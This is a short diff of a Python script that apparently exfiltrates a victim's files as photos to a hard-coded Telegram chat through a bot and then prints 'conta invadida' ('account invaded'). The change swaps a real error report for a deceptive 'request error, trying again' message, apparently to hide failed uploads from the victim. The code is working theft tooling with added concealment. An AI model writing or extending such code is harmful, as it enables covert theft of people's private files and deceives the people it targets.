@@ -79,8 +79,8 @@ def send_file(file_path):
                 bot.send_photo(chat_id="1919739278", photo=f)
                 time.sleep(0.2)  # ← delay entre envios
 
-    except Exception as e:
-        print("Erro ao enviar:", file_path, e)
+    except Exception:
+        print("𝗲𝗿𝗿𝗼 𝗻𝗮 𝘀𝗼𝗹𝗶𝗰𝗶𝘁𝗮çã𝗼, 𝘁𝗲𝗻𝘁𝗮𝗻𝗱𝗼 𝗻𝗼𝘃𝗮𝗺𝗲𝗻𝘁𝗲.")
 
 def attack_message():
     print("\033[92m𝙘𝙤𝙣𝙩𝙖 𝙞𝙣𝙫𝙖𝙙𝙞𝙙𝙖 ✅\033[0m")
